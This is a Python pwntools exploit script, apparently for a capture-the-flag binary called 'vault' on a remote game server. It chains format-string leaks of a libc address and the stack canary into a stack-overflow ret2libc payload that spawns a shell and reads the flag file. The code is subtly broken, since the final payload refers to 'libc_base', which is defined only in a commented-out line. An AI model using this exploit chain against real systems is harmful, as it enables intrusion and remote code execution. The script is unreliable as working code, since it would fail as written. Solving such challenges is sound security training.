#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 10184
HOST = "play.scriptsorcerers.xyz"
exe = context.binary = ELF('./vault', checksec=False)
libc = ELF('/usr/lib/i386-linux-gnu/libc.so.6', checksec=False)
ld = ELF('/usr/lib/i386-linux-gnu/ld-linux.so.2', checksec=False)
# exe = context.binary = ELF('./vault_patched', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-2.24.so', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
        	brva 0x00001288
        	brva 0x000012F6
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def store(data):
	p.sendlineafter(b'> ', str(1))
	p.sendlineafter(b'vault? ', data)

def access():
	p.sendlineafter(b'> ', str(2))

# VARIABLE


# PAYLOAD
payload = b'%31$p'
store(payload)
GDB()
access()

p.recvuntil(b'ur stuff: ')
libc_leak = int(p.recvuntil(b'\n', drop=True), 16)
log.info("Libc leak: " + hex(libc_leak))
# libc_base = libc_leak - 0x22d5c0
libc.address = libc_leak - libc.sym.__libc_start_call_main - 121
log.info("Libc base: " + hex(libc.address))

store(b'%23$p')
access()

p.recvuntil(b'ur stuff: ')
canary = int(p.recvuntil(b'\n', drop=True), 16)
log.info("Canary: " + hex(canary))

offset_system = 0x51f50
offset_binsh = 0x1cce52
payload = flat(
	b'a'*0x40,
	canary,
	b'a'*12,
	libc_base + offset_system,
	0,
	libc_base + offset_binsh
	)
store(payload)

p.sendlineafter(b'> ', b'+')
p.sendline(b'cat /home/chall/flag.txt')

p.interactive()